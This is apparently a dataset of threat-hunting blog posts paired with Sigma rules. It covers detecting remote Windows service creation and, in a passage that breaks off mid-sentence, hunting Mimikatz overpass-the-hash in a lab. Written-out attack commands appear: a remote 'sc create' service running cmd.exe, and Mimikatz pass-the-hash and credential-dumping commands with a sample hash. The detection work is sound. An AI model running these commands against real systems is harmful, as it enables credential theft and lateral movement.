    "markdown": "# Threat Hunting #26 - Remote Windows Service Creation / Recon\n\n**Date:** Sunday, 3 March 2019\n\nInteracting remotely with windows services is one way to execute programs remotely as well as persisting across system reboots. It can be done via different utilities (sc.exe, WMI etc.) but in this post we will be focusing more on artifacts and methods to detect this based on static behavioral indicators and independently from the used utilities.\n\n## A) Create remotely a service using legit windows built-in utilities:\n\nExample of a command to create remotely a new service \"remotesvc\" on host 1.2.3.4 that persist system reboot and executes cmd.exe:\n\n```\nsc \\\\1.2.3.4 create remotesvc binpath= cmd.exe type= own start= auto\n```\n\nFrom the source machine, we can see clearly sc.exe is connecting to a remote host and source|destination ports are both dynamic RCP port numbers [TCP 49152-65535]:\n\n```image\nAlt: Remote Service Creation\nDescription: The image displays two event log entries from Sysmon, detailing network connections detected on a Windows system. Each entry shows various parameters such as 'RuleName', 'UtcTime', 'ProcessId', 'SourceIp', 'DestinationIp', and 'DestinationPort'. The left entry corresponds to a network connection from source IP 10.2.2.217 to destination IP 10.2.2.215, while the right entry similarly shows a connection from the same source to a different destination, highlighting different destination ports. This information is crucial for analyzing remote service creation and potential threats.\nTranscription: |\n  Event Properties - Event 3, Sysmon (Left)\n  \n  General\n  - RuleName: Network connection detected\n  - UTC Time: 2019-03-20 23:21:31.324\n  - ProcessGuid: {351b2b7f-2dbf-5c00-0013aab48094}\n  - ProcessId: 3156\n  - Image: C:\\Windows\\System32\\svchost.exe\n  - User: EXAMPLE\\User1\n  - Protocol: tcp\n  - SourceIp: 10.2.2.217\n  - SourceHostname: PC01.example.corp\n  - SourcePort: 49329\n  - DestinationIp: 10.2.2.15\n  - DestinationHostname: false\n  - DestinationPort: 49152\n  \n  Event Properties - Event 3, Sysmon (Right)\n  \n  General\n  - RuleName: Network connection detected\n  - UTC Time: 2019-03-20 23:21:31.924\n  - ProcessGuid: {2b7c7e7b-2d7c-5c00-0013aab48094}\n  - ProcessId: 3156\n  - Image: C:\\Windows\\System32\\svchost.exe\n  - User: EXAMPLE\\User1\n  - Protocol: tcp\n  - SourceIp: 10.2.2.217\n  - SourceHostname: PC01.example.corp\n  - SourcePort: 49329\n  - DestinationIp: 10.2.2.15\n  - DestinationHostname: false\n  - DestinationPort: 49152\n  \n  Log Name: Microsoft-Windows-Sysmon/Operational\n  - Source: Sysmon\n  - Logged: 3/2/2019 2:53:43 PM\n  - Task Category: Network connection detected\n  - Computer: PC01.example.corp\n  - User: SYSTEM\n  - OpCode: Info\n  - More Information: Event Log Online Help\n```\n\nMonitoring sc.exe process execution command line and network connections is good but not resilient enough and can be bypassed easily as a detection (a.k.a rename sc.exe to something else and run it from another folder).\n\nOn the target machine, the most interesting observed events are:\n\n### Windows Built-in:\n\n- [System Events] Event-ID 7045: A service was installed on the system (expected, since we've created a service)\n- [Security Events] Event-ID 5156: The Windows Filtering Platform has allowed a connection\n\nIf you enable System > Security System Extension in your Advanced Audit Policy GPO you will be able to see eventid 4697 in your security events and which is equivalent to 7045.\n\n### Sysmon:\n\n- [Sysmon RegValueSet] ID 13: Registry Value Set (HKLM\\System\\CurrentControlSet\\services\\<svcname>\\*, which is expected since we've created a service)\n- [Sysmon Network Connect] ID 3: Network Connection Detected\n\nBoth events 5156 and 3 (sysmon) contain same information and indicates incoming and/or outgoing network connections from the services.exe process to the source machine of our command. Which is a good indication of remote interaction with the service control manager on the target machine.\n\n#### Sysmon's observed key events:\n\n```image\nAlt: Sysmon Events\nDescription: The image consists of two sections showing Windows Event Viewer details for Sysmon events. The left panel displays Event 3, highlighting a network connection detection, with specific entries such as the source and destination IP addresses, as well as the image path of the service involved. The right panel shows Event 13, which details a registry value set event, including the image path and target object related to the service creation. Important timestamps and log names are included at the bottom of both panels, indicating when these events were logged.\nTranscription: |\n  Event Properties - Event 3, Sysmon\n  ------------------------------------\n  General\n  - Logged: 3/29/2019 2:48:59 PM\n  - Event ID: 3\n  - Task Category: Network connection detected\n  - Keywords: 0x80000000000000\n  - Source: Microsoft-Windows-Sysmon/Operational\n  - Computer: PC01.example.corp\n  \n  Details\n  - Network connection detected:\n    - Time: 2019-03-29 20:59:49.501\n    - ProcessId: 5838\n    - ProcessGuid: {3b3e2b79-5b9d-5bcb-0000-00105a500000}\n    - Image: C:\\Windows\\System32\\services.exe\n    - SourceName:\n    - SourcePort: 0\n    - DestinationIp: WIN-7LTAPHQ1R\n    - DestinationPort: 5901\n  \n  Event Properties - Event 13, Sysmon\n  -------------------------------------\n  General\n  - Logged: 3/29/2019 2:48:38 PM\n  - Event ID: 13\n  - Task Category: Registry value set\n  - Keywords: 0x80000000000000\n  - Source: Microsoft-Windows-Sysmon/Operational\n  - Computer: PC01.example.corp\n  \n  Details\n  - Registry value set:\n    - Time: 2019-03-29 20:26:58.501\n    - ProcessId: 5838\n    - ProcessGuid: {3b3e2b79-5b9d-5bcb-0000-00105a500000}\n    - Image: C:\\Windows\\System32\\services.exe\n    - TargetObject: HKLM\\System\\CurrentControlSet\\services\\badstuff\\ImagePath\n    - Details: cmd.exe\n```\n\n#### Windows's builtin observed key events:\n\n```image\nAlt: Windows Events\nDescription: The image showcases three sections of event properties from Windows security auditing. Each section provides details on specific security events related to service creation and connections. Key information includes the application name, security IDs, time stamps, and event types. The first section details a connection event, while the second and third sections focus on a service installation and its associated logs. The image serves as a technical reference for monitoring and analyzing Windows events relevant to threat detection.\nTranscription: |\n  Event Properties: Event ID 5140, Microsoft Windows security auditing.\n  \n  Application Information:\n  - Application Name: [Unknown]\n  - Application ID: 512\n  - Network Information:\n    - Source Address: [Unknown]\n    - Source Port: 0\n  - File Information:\n    - Share Name: [Unknown]\n    - Share Path: [Unknown]\n    - Share Type: 0\n  \n  Event Properties: Event ID 4656, Microsoft Windows security auditing.\n  \n  Application Information:\n  - Application Name: C:\\Windows\\System32\\services.exe\n  - Application ID: 512\n  - Network Information:\n    - Source Address: [Unknown]\n    - Source Port: 0\n  - File Information:\n    - Share Name: [Unknown]\n    - Share Path: [Unknown]\n    - Share Type: 0\n  \n  Event Properties: Event ID 7045, Service Control Manager.\n  \n  Log Name: System\n  Source: Service Control Manager\n  Logged: 3/20/2019 12:37:47 AM\n  Event Category: Service Installation\n  Event ID: 7045\n  Task Category: None\n  Level: Information\n  User: NT AUTHORITY\\SYSTEM\n  Computer: PC01.example.com\n```\n\n## B) Creating a remote service using external utilities (i.e. psexec, paexec, psexec_psh, remcom etc.):\n\nThe aforementioned third party utilities are extremely useful for an attacker to move laterally and expand the compromise. High level modus operandi is quite simple and similar across this category of utilities:\n1. Extract a service PE from its resource section or download it from elsewhere\n2. Copy the extracted PE to the destination host\n3. Register a service on the destination machine (with binpath pointing to the PE extracted in step 2) and send a start control to begin execution\n4. Start Interacting with the remote machine\n\nTo detect reliably the above steps we will be using our best friend event 5145:\n\n- [Security] EventID 5145 - A network share object was checked to see whether client can be granted desired access -> will help us to detect step 2 and 3 from the destination host security events:\n\n```image\nAlt: Detection\nDescription: The image displays two instances of Windows Event ID 5145, which are used for auditing security related to network shares. Each instance provides detailed information about attempts to access network share objects, with specific focus on security identifiers (SIDs), account names, network information, and access requests. The highlighted sections indicate the relevant share paths, file names, and access permissions associated with the events, which are crucial for detecting lateral movement in a cybersecurity context.\nTranscription: |\n  Event Properties  Event 5145  Microsoft Windows security auditing.\n  \n  General  Details\n  \n  A network share object was checked to see whether client can be granted desired access.\n  \n  Subject:\n    Security ID: S-1-5-21-358634148-1414523683-2922671688-1000\n    Account Name: Eliezer\n    Account Domain: PC01\n    Logon ID: 0x7ACCB8\n  \n  Network Information:\n    Network Type: File\n    Object Type: File\n    Object Name: 100.216\n    Source Port: 499456\n  \n  Share Information:\n    Share Name: \\\\ADMIN$\n    Relative Target Name: RemComSvc.exe\n  \n  Access Request Information:\n    Access Mask: 0x12190\n    READ_CONTROL\n    SYNCHRONIZE\n    WriteData (or AddFile)\n   \n    Appended: 0x0 (AddSubdirectory or CreatePipeInstance)\n    WriteEA\n    ReadAttributes\n    WriteAttributes\n  \n  Log Name: Security\n    Event Source: Microsoft Windows security auditing.\n    Event ID: 5145\n    Information: Detailed File Share\n    Keywords: Audit Success\n    User: PC01.example.com\n    OpCode: Info\n    Event Log Online Help\n  \n  Event Properties  Event 5145  Microsoft Windows security auditing.\n  \n  General  Details\n  \n  A network share object was checked to see whether client can be granted desired access.\n  \n  Subject:\n    Security ID: S-1-5-21-358634148-1414523683-2922671688-1000\n    Account Name: Eliezer\n    Account Domain: PC01\n    Logon ID: 0x7ACCB8\n  \n  Network Information:\n    Network Type: File\n    Object Type: File\n    Object Name: 100.216\n    Source Port: 499456\n  \n  Share Information:\n    Share Name: \\\\PC$\n    Relative Target Name: svccctl\n  \n  Access Request Information:\n    Access Mask: 0x12197\n    READ_CONTROL\n    SYNCHRONIZE\n    WriteData (or AddFile)\n   \n    Appended: 0x0 (AddSubdirectory or CreatePipeInstance)\n    WriteEA\n    ReadAttributes\n    WriteAttributes\n  \n  Log Name: Security\n    Event Source: Microsoft Windows security auditing.\n    Event ID: 5145\n    Information: Detailed File Share\n    Keywords: Audit Success\n    User: PC01.example.com\n    OpCode: Info\n    Event Log Online Help\n```\n\n### Detection & Takeaways:\n\n#### Correlation Rule 1 (standard remote service creation - windows builtin):\n\n```\n[EventID=5156 and ApplicationName like \"*\\services.exe\" and SourceAddress != DestinationAddress and SourcePort>=49152 and DestinationPort>=49152 and SourceAddress!=Null and DestinationAddress!=Null] followed by (EventID=7045 or EventID=4697) within 1 min and same ComputerName.\n```\n\n#### Correlation Rule 2 (standard remote service creation - sysmon):\n\n```\n[EventID=13 and TargetObject like \"HKLM\\System\\CurrentControlSet\\services\\*\"] followed by [EventID=3 and SourceIP != DestinationIP and SourcePort>=49152 and DestinationPort>=49152 and Image like \"*\\services.exe\" and SourceIP!=Null and DestinationIP !=Null] within 1 minute and Same ComputerName.\n```\n\n#### Correlation Rule 3 (psexec family):\n\n```\n[EventID=5145 and ShareName=(\\\\*\\ADMIN$ or \\\\*\\C$) and event.payloads contains \"WriteData\"] followed by [EventID=5145 & ShareName='\\\\*\\IPC$' and RelativeTargetName:'svcctl')] within 1min and with Same [AccountName, SourceAddres,Port] and Same ComputerName\n```\n\n**Labels:** persistence, remote execution, windows services",
    "sigma_rule": {
      "title": "Remote Service Activity via SVCCTL Named Pipe",
      "id": "586a8d6b-6bfe-4ad9-9d78-888cd2fe50c3",
      "status": "test",
      "description": "Detects remote service activity via remote access to the svcctl named pipe",
      "references": [
        "https://web.archive.org/web/20230329155141/https://blog.menasec.net/2019/03/threat-hunting-26-remote-windows.html"
      ],
      "author": "Samir Bousseaden",
      "date": "2019-04-03",
      "modified": "2024-08-01",
      "tags": [
        "attack.lateral-movement",
        "attack.persistence",
        "attack.t1021.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure"
      },
      "detection": {
        "selection": {
          "EventID": 5145,
          "ShareName": "\\\\\\\\\\*\\\\IPC$",
          "RelativeTargetName": "svcctl",
          "AccessList|contains": "WriteData"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_svcctl_remote_service.yml",
    "id": "787"
  },
  {
    "url": "https://web.archive.org/web/20220419045003/https://cyberwardog.blogspot.com/2017/04/chronicles-of-threat-hunter-hunting-for.html",
    "markdown": "# Chronicles of a Threat Hunter: Hunting for In-Memory Mimikatz with Sysmon, Win Event Logs, and ELK - Part III (Overpass-the-Hash - EIDs 10, 4624, 4648, 4768)\n\nIn my last posts about hunting for In-memory mimikatz that you can read here and here, I showed you that even though Mimikatz is executed without touching disk, it was still loading the same modules/Images and accessing Lsass.exe with the same permissions as if it would have done so. My goal with this research has been primarily to develop a strong fingerprint to detect In-memory mimikatz without focusing on the name of the script, command lines, strings of code, or even its hash, but its patterns of behavior.\n\nIn this post, I will show you how we can also hunt for Mimikatz when it is used to move laterally in the network. Mimikatz uses a technique named \"Overpass the Hash\" which places a compromised hash into the MSV1_0 and Kerberos service provider to then run a process under different credentials and access other remote systems that the stolen token has access to. As usual, I will be using Sysmon to get extra visibility on the endpoint and my ELK Stack to parse our logs and have a better visualization of them. In addition, I will add Windows Event logs to our detection technique because it can provide more context to our fingerprint and helps us to reduce the number of false positives.\n\n## Requirements:\n\n- Sysmon Installed (I have version 6 installed)\n- Winlogbeat forwarding logs to an ELK Server\n- I recommend to read my series \"Setting up a Pentesting.. I mean, a Threat Hunting Lab\" specifically part 5 & 6 to help you set up your environment if you haven't set up one yet.\n- Mimikatz Binary (Version 20170328)\n- I also recommend reading Part I and Part II of Hunting for In-Memory Mimikatz to understand the methodology.\n- Basic understanding of Access rights for process objects. You can learn about it here.aspx) or here (Part II of hunting for In-Memory Mimikatz)\n\n## OverPass-The-Hash\n\nMimikatz can perform the well-known operation 'Pass-The-Hash' to run a process under another credentials with NTLM hash of the user's password, instead of its real password. When the user logs in, Windows creates a long term key for each encryption method supported by the client OS before requesting/obtaining a TGT. Multiple encryption types are normally available. The client should choose the strongest mutually-supported encryption type, but of course an attacker can produce a downgrade attack and choose weaker encryption. Here's a brief summary of possible encryption types:\n\n- DES-CBC-CRC (disabled by default in Vista/2008)\n- DES-CBC-MD5 (disabled by default in Vista/2008)\n- RC4-HMAC (XP & 2003 default, as well as the strongest encryption they support)\n- AES128-CTS-HMAC-SHA1-96 (introduced with Vista/2008)\n- AES256-CTS-HMAC-SHA1-96 (default in Vista/2008 and higher)\n\nAs you can see above, Windows 7 systems support the newer AES. However, it can also still support older RC4 algorithms. As we know, Microsoft uses the NT (NTLM) hash for Kerberos RC4 encryption which is why this attack is very easy to do. All it takes is to inject the compromised NTLM hash into a new process, downgrade the level of encryption to RC4 and obtain a TGT.\n\n### Ticket Encryption Types\n\n| Encryption Type          | Dec | Hex  | Comment                  |\n| ------------------------ | --- | ---- | ------------------------ |\n| des-cbc-crc              | 1   | 0x1  | (legacy) Windows 2000+   |\n| des-cbc-md4              | 2   | 0x2  | not supported in Windows |\n| des-cbc-md5              | 3   | 0x3  | (legacy) Windows 2000+   |\n| des3-cbc-sha1            | 5   | 0x5  | not supported in Windows |\n| aes-128-cts-hmac-sha1-96 | 17  | 0x11 | Windows Vista/2008+      |\n| aes-256-cts-hmac-sha1-96 | 18  | 0x12 | Windows Vista/2008+      |\n| rc4-hmac(arcfour-hmac)   | 23  | 0x17 | Windows 2000+            |\n| rc4-hmac-exp             | 24  | 0x18 | Windows 2000+            |\n\n### Event ID 4624: An Account was successfully logged on\n\nThis is a highly valuable event since it documents each and every successful attempt to logon to the local computer regardless of logon type, location of the user or type of account. Source\n\n### Logon Types\n\nSource.aspx#properties)\n\n| Logon Type                   | Description                                                                                                                                                                                                                                                                                                                                                    |\n| ---------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Interactive (2)              | Intended for users who are interactively using the machine, such as a user being logged on by a terminal server, remote shell, or similar process. Logon at keyboard and screen of system.                                                                                                                                                                     |\n| Network (3)                  | Intended for high-performance servers to authenticate clear text passwords. LogonUser does not cache credentials for this logon type. (i.e. connection to shared folder on the computer from elsewhere on network)                                                                                                                                             |\n| Batch (4)                    | Intended for batch servers, where processes can be executed on behalf of a user without their direct intervention; or for higher performance servers that process many clear-text authentication attempts at a time, such as mail or web server. LogonUser does not cache credentials for this logon type.                                                     |\n| Service (5)                  | Indicates a service-type logon. The account provided must have the service privileged enabled.                                                                                                                                                                                                                                                                 |\n| Proxy (6)                    | Indicates a proxy-type logon.                                                                                                                                                                                                                                                                                                                                  |\n| Unlock (7)                   | This logon type is intended for GINA DLLs logging on users who are interactively using the machine. This logon type allows a unique audit record to be generated that shows when the workstation was unlocked.                                                                                                                                                 |\n| NetworkClearText (8)         | Preserves the name and password in the authentication packages, allowing the server to make connections to other network servers while impersonating the client. This allows a server to accept clear text credentials from a client, call LogonUser, verify that the user can access the system across the network, and still communicate with other servers. |\n| NewCredentials (9)           | Allows the caller to clone its current token and specify new credentials for outbound connections. The new logon session has the same local identity, but uses different credentials for other network connections.                                                                                                                                            |\n| RemoteInteractive (10)       | Terminal Services session that is both remote and interactive.                                                                                                                                                                                                                                                                                                 |\n| CachedInteractive (11)       | Attempt cached credentials without accessing the network.                                                                                                                                                                                                                                                                                                      |\n| CachedRemoteInteractive (12) | Same as RemoteInteractive. This is used for internal auditing.                                                                                                                                                                                                                                                                                                 |\n| CachedUnlock (13)            | Workstation logon.                                                                                                                                                                                                                                                                                                                                             |\n\n## Getting ready to hunt for Mimikatz\n\n### Getting a Sysmon Config ready\n\nAgain, we need a basic Sysmon config to ONLY monitor for **\"Process Creation\"** and **\"ProcessAccess\"** (Targeting Lsass.exe) events.\n\n```\n<Sysmon schemaversion=\"3.30\">\n   <!-- Capture all hashes -->\n   <HashAlgorithms>md5</HashAlgorithms>\n   <EventFiltering>\n      <!-- Event ID 1 == Process Creation. -->\n      <ProcessCreate onmatch=\"exclude\"/>\n      <!-- Event ID 2 == File Creation Time. -->\n      <FileCreateTime onmatch=\"include\"/>\n      <!-- Event ID 3 == Network Connection. -->\n      <NetworkConnect onmatch=\"include\"/>\n      <!-- Event ID 5 == Process Terminated. -->\n      <ProcessTerminate onmatch=\"include\"/>\n      <!-- Event ID 6 == Driver Loaded.-->\n      <DriverLoad onmatch=\"include\"/>   \n      <!-- Event ID 7 == Image Loaded. -->\n      <ImageLoad onmatch=\"include\"/>\n      <!-- Event ID 8 == CreateRemoteThread. -->\n      <CreateRemoteThread onmatch=\"include\"/>\n      <!-- Event ID 9 == RawAccessRead. -->\n      <RawAccessRead onmatch=\"include\"/>       \n      <!-- Event ID 10 == ProcessAccess. -->\n      <ProcessAccess onmatch=\"include\">\n         <TargetImage condition=\"is\">C:\\Windows\\system32\\lsass.exe</TargetImage>\n      </ProcessAccess>\n      <!-- Event ID 11 == FileCreate. -->\n      <FileCreate onmatch=\"include\"/>\n      <!-- Event ID 12,13,14 == RegObject added/deleted, RegValue Set, RegObject Renamed. -->\n      <RegistryEvent onmatch=\"include\"/>\n      <!-- Event ID 15 == FileStream Created. -->\n      <FileCreateStreamHash onmatch=\"include\"/>\n      <!-- Event ID 17 == PipeEvent. -->\n      <PipeEvent onmatch=\"include\"/>    \n  </EventFiltering>\n</Sysmon>\n```\n\nDownload and save the Sysmon config in a preferred location of your choice. Then, update your Sysmon rules configuration. In order to do this, make sure you run cmd.exe as administrator, and use the configuration you just downloaded. Run the following commands:\n\n```\nSysmon.exe -c [Sysmon config xml file]\n```\n\nThen, confirm if your new config is running by typing the following:\n\n```\nsysmon.exe -c [Sysmon config xml file]\n```\n\n### Getting a Kibana dashboard ready\n\nAs always, instead of looking at all the Sysmon logs created in the event viewer console, I prefer to have all my logs in different visualizations under one dashboard. It makes the analysis way easier allowing me to look at all the data at once and filter out noise. Make sure you add Windows event logs to it. If you want to learn the basics of how to build a Kibana dashboard, you can read about it here and here. Create one similar to the one shown in figure 1 below.\n\n```image\nAlt: OverPassTheHash Dashboard\nDescription: The image is a Kibana dashboard specifically designed for monitoring and analyzing Sysmon logs related to Mimikatz activity. It features multiple visualizations including pie charts for Global Events, Logon Types, and Granted Access Permissions. Additionally, it lists the Top 10 Source Images, Target Images, Processes, and Command Lines with corresponding counts. Below the visualizations, there is a detailed events table displaying timestamps, computer names, event IDs, logon types, and subject/domain information. This dashboard allows threat hunters to efficiently analyze data and filter out irrelevant information.\nTranscription: |\n  OverPassTheHash\n  \n  Global Events\n  - Count: 0\n  - Count: 0\n  - Count: 0\n  - Count: 0\n  - Count: 0\n  - Count: 0\n  - Count: 0\n  - Count: 0\n  \n  Logon Types\n  - Count: 0\n  \n  Granted Access Permissions\n  - Count: 0\n  - Count: 0\n  \n  Top 10 Source Images\n  - event_data.SourceImage.keyword: Descending: 0\n    - C:\\Windows\\System32\\mimikatz.exe: Count: 1\n    - C:\\Windows\\System32\\cmd.exe: Count: 1\n  \n  Top 10 Target Images\n  - event_data.TargetImage.keyword: Descending: 0\n    - C:\\Windows\\System32\\mimikatz.exe: Count: 1\n    - C:\\Windows\\System32\\lsass.exe: Count: 1\n  \n  Top 10 Processes\n  - event_data.Image.keyword: Descending: 0\n    - C:\\Windows\\System32\\mimikatz.exe: Count: 1\n    - C:\\Windows\\System32\\cmd.exe: Count: 1\n  \n  Top 10 Command Line\n  - event_data.CommandLine.keyword: Descending: 0\n    - C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe: Count: 1\n    - C:\\Windows\\System32\\cmd.exe: Count: 1\n  \n  Events\n  - Time: March 21, 2023 12:00:00\n    - Computer Name: computer1\n    - Event ID: 4624\n    - Event Data.LogonType: 3\n    - Event Data.SubjectUserSid: S-1-5-18\n    - Event Data.SubjectDomainName: NT AUTHORITY\n  - Time: March 21, 2023 12:01:00\n    - Computer Name: computer1\n    - Event ID: 4624\n    - Event Data.LogonType: 3\n    - Event Data.SubjectUserSid: S-1-5-18\n    - Event Data.SubjectDomainName: NT AUTHORITY\n  - Time: March 21, 2023 12:02:00\n    - Computer Name: computer1\n    - Event ID: 4624\n    - Event Data.LogonType: 3\n    - Event Data.SubjectUserSid: S-1-5-18\n    - Event Data.SubjectDomainName: NT AUTHORITY\n```\n\n### Delete/Clean your Index\n\nIn order to reduce the number of logs before and during executing Mimikatz, make sure you delete/clear your Index by running the following command as shown in figure 2 below:\n\n```\ncurl -XDELETE 'localhost:9200/[name of your index]?pretty'\n```\n\nDo this again a few seconds before you run Mimikatz against your compromised computer.\n\n```image\nAlt: Deleting/Clearing Index\nDescription: The image shows a terminal window displaying a command executed to delete an index in an Elasticsearch database. The command used is 'curl -XDELETE 'localhost:9200/winlogbeat-*?pretty'', which indicates that a deletion request was sent to the specified index. The output confirms that the deletion was acknowledged with '\"acknowledged\" : true'. This is relevant to the context of preparing for a Mimikatz hunt in cybersecurity.\nTranscription: |\n  wardog@ELK-THIR:~$ curl -XDELETE 'localhost:9200/winlogbeat-*?pretty'\n  {\n    \"acknowledged\" : true\n  }\n  wardog@ELK-THIR:~$\n```\n\n## Hunting for Mimikatz\n\n### Download the latest Mimikatz Trunk\n\nDownload the latest binary from here. As I showed you before, running Mimikatz on disk or in memory should provide the same behavior. In both scenarios the mimikatz module is used with the difference that when done in memory, it is reflectively loaded in memory without touching disk. Modules/Images and permissions are the same.\n\n### Scenario\n\nYour box got compromised and unfortunately your manager logged on interactively to your computer with domain admin credentials, but your sys admins are superstars and disabled WDIGEST to not allow plaintext passwords stored in lsass. Great!, wait, but the adversary was able to still get the NTLM hash of the domain admin account in your box. What can they do?\n\n### Run OverPass-The-Hash\n\nOpen cmd.exe as administrator, and first try to get a directory listing from the Domain Controller in your environment. In my network it is named HFDC01.hf.com. Run the following commands as shown in figure 3 below.\n\n```\ndir \\\\HFDC01.hf.com\\c$\n```\n\n```image\nAlt: Access denied to the DC\nDescription: The image shows a command prompt window displaying the output of a command attempting to access a directory on a domain controller (DC) named HFDC01.hf.com. The command executed is 'dir \\\\HFDC01.hf.com\\c$'. The output indicates 'Access is denied.', highlighting a failed attempt to access the directory due to insufficient permissions. This is relevant to the context of threat hunting and Mimikatz, illustrating the challenges in accessing secure resources.\nTranscription: |\n  c:\\>dir \\\\HFDC01.hf.com\\c$\n  Access is denied.\n  c:\\>\n```\n\nAs you can see in figure 3 above, if the adversary tries to get to the DC with your permissions/Token, he or she will not succeed.\n\nNext, it is time to run **\"OverPass-The-Hash\"** (Make sure you delete/clean your index seconds before you run Mimikatz). Let's assume you have the hash of the DA account already (if not, use sekurlsa::logonpasswords to get hashes from memory). Then, in your same shell run as admin, run the following commands:\n\n```\nmimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:<username> /domain:<domain name> /ntlm:<NTLM hash>\" Exit\n```\n\n```image\nAlt: Running Mimikatz PTH module\nDescription: The image shows a command prompt window displaying the execution of the Mimikatz tool. The command run includes 'privilege::debug' and 'sekurlsa::pth /user:pdulce /domain:hf.com /ntlm:<NTLM hash>'. It also shows the output of the Mimikatz tool, indicating that it has successfully obtained privileges and is ready for further commands. The background indicates that this is a Windows environment, and the command prompt is running with administrative privileges.\nTranscription: |\n  mimikatz_trunk\\x64\\mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:pdulce /domain:hf.com /ntlm:426f6c92585f8d346c651b87e6c466\"\n  \n  mimikatz (x64) v2.1.1 (64-bit) built on Mar 29 2017 23:20:11\n```\n\nAs you can see in figure 4 above, we were able to start another **cmd.exe** process but with the **NTLM hash** of our DA hf\\pdulce. Also, our preferred encryption algorithm is now only RC4 as explained before (Encryption Downgrade to obtain TGTs with our compromised NTLM). Finally, try to get a directory list of the DC again. You will see that with the new **cmd.exe** shell running as **hf\\pdulce**, you can successfully do it.\n\n```image\nAlt: Access to DC with cmd running as DA account\nDescription: The image displays a command prompt interface showing the execution of Mimikatz, a tool used for extracting credentials from memory. The command `privilege::debug` is shown followed by the `sekurlsa::pth` command, which indicates an attempt to pass the hash for a user named 'pdulce' in the domain 'domainhf.com'. Below this, the output of a directory listing of the Domain Controller (DC) is also visible, revealing successful access to the DC's file system. The presence of system information and specific commands illustrates a technical scenario related to cybersecurity and threat hunting.\nTranscription: mimikatz 2.1.1 (x64) built on Mar 29 2017 23:20:11\n```\n\n### First Look at our Dashboard\n\nGo to your dashboard and refresh it to show you what happened in the past 15 mins. Right away we can see a few relevant things:\n\n- EID 1 (Process Create)\n- EID 4688 (A new Process)\n- EID 10 (Process Access)\n- EID 4624 (An account was successfully logged on)\n- EID 4648 (A logon was attempted using explicit credentials)\n- EID 4656 (A handle to an object was requested)\n- EID 4672 (Special privileges assigned to new logon)\n- Logon Type 9 (NewCredentials)\n- GrantedAccess codes/permissions: 0x1010 & 0x1038\n\n```image\nAlt: OverPass-The-Hash dashboard\nDescription: The image depicts a dashboard interface displaying various metrics and logs related to cybersecurity events. It includes visual representations such as pie charts and bar graphs indicating global events, logon types, and granted access permissions. Specific data points are highlighted, showing counts of top source images, target images, and processes involved in the events. Additionally, there is a table listing detailed event logs with timestamps and event IDs, providing a structured overview of activities relevant to threat hunting, specifically focusing on the OverPass-the-Hash technique.\nTranscription: |\n  Global Events\n  -  EID 1:  6,058\n  -  EID 10:  6,584\n  -  EID 4624:  4,634\n  -  EID 4648:  2\n  -  EID 4656:  4,634\n  -  EID 4672:  4,672\n  \n  Logon Types\n  -  Logon Type 9:  1\n  \n  GrantedAccess Permissions\n  -  0x1010:  1\n  -  0x1038:  1\n  \n  Top 10 Source Images\n  -  event_data.SourceImage.keyword: Descending\n    -  C:\\Windows\\system32\\mimikatz.exe:  2\n    -  C:\\Windows\\system32\\lsass.exe:  1\n  \n  Top 10 Target Images\n  -  event_data.TargetImage.keyword: Descending\n    -  C:\\Windows\\system32\\lsass.exe:  2\n    -  C:\\Windows\\system32\\mimikatz.exe:  1\n  \n  Top 10 Processes\n  -  event_data.Image.keyword: Descending\n    -  C:\\Windows\\system32\\mimikatz.exe:  1\n    -  C:\\Windows\\system32\\lsass.exe:  1\n  \n  Top 10 Parent Processes\n  -  event_data.ParentImage.keyword: Descending\n    -  C:\\Windows\\system32\\mimikatz.exe:  1\n    -  C:\\Windows\\system32\\lsass.exe:  1\n  \n  Top 10 Command Line\n  -  event_data.CommandLine.keyword: Descending\n    -  C:\\Windows\\system32\\mimikatz.exe:  1\n    -  C:\\Windows\\system32\\lsass.exe:  1\n  \n  Events\n  -  April 7 2017, 05:27:36:  5484 - 5:1:5:1:2:3:4:5:6:7:8:9:10 - 1H\n  -  April 7 2017, 05:27:36:  5484 - 5:1:5:1:2:3:4:5:6:7:8:9:10 - 1H\n  -  April 7 2017, 05:27:36:  5484 - 5:1:5:1:2:3:4:5:6:7:8:9:10 - 1H\n```\n\nIn figure 6 on the visualization located at the bottom of the dashboard, we can see a timeline of events which can help us understand step by step what happened when we executed the **OverPass-the-Hash** technique.\n\n### Filter potential Noise\n\n- **EID 4688 and EID 1** are technically the same with the difference that EID 4688 provides information about the token type which can help us understand when a new process has been launched with a high elevated privilege. However, there are applications or modules in the system also that get started automatically with this token type such as taskhost.exe, dllhost.exe, etc. Basically everything as Local System (S-1-5-18).\n- **EID 1**: We cannot assume that the adversary will use cmd.exe every time it uses this technique. Therefore, I won't consider that as part of the fingerprint. We can consider this as a filter when the process is very suspicious (i.e. powershell running notepad or explorer.exe or svchost or vice-versa).\n- **EID 4672**: Special privileges assigned to new logon. This could turn very noisy since it is part of every authentication process and the privileges assigned are not unique.\n- **EID 4656**: A handle to an object was requested. Very noisy too for this case. Part of the custom auditing that I enabled in my environment. This technique does not create a handle to SAM. This event shows PlugPlayManager as the object. This specific log is created a lot by other events.\n\n### EID 4624 with Logon Type 9 (New Credentials)?\n\nThis is good! Right at the same millisecond that we spawn the new cmd.exe with the compromised NTLM hash, we can see this log. Lets remember what Logon Type 9 means:\n\n> \"Allows the caller to clone its current token and specify new credentials for outbound connections. The new logon session has the same local identity, but uses different credentials for other network connections.\"\n\nThis matches the **OverPass-the-Hash** behavior.\n\n### EID 10 with Granted Access 0x1010 & 0x1038?\n\nDo you remember part II of Hunting for In-Memory Mimikatz? **0x1010** permissions were needed to access the memory contents of lsass and obtain credentials. We can see the same happening here, but we now have an extra **GrantedAccess** code: **0x1038**. If you are not familiar with these permissions, you can read about them here.aspx).\n\n**GrantedAccess: 0x1038:**\n- **0x1000**: PROCESS_QUERY_LIMITED_INFORMATION\n- **0x0010**: PROCESS_VM_READ\n- **0x0020**: PROCESS_VM_WRITE (Required to write to memory in a process using WriteProcessMemory)\n- **0x0008**: PROCESS_VM_OPERATION (Required to perform an operation on 